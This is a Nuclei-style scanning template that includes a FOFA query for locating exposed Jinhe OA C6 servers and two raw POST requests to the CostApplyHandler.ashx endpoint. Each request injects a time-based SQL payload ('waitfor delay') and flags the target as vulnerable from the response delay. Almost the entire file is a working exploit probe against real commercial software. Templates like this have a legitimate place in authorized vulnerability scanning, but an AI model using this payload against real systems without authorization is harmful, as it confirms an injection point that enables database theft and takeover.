id: jinhe-oa-c6-costapplyhandler-sqli
info:
  name: 金和OAC6 CostApplyHandler 接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
      金和网络-金和OA系统在CostApplyHandler接口处理逻辑中存在SQL注入缺陷，攻击者可通过构造恶意输入参数绕过安全验证，直接执行任意SQL语句，导致数据库敏感信息泄露或系统权限被篡夺。该漏洞源于用户输入未经过严格过滤和参数化处理，允许攻击者在请求中注入恶意SQL代码。
  tags: 金和OAC6
http:
- raw:
  - |
    POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/CostApplyHandler.ashx HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    action=YeahChange&yeah=1'waitfor+delay+'0:0:5'--+
  - |
    POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/CostApplyHandler.ashx HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    action=YeahChange&yeah=1'waitfor+delay+'0:0:8'--+
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
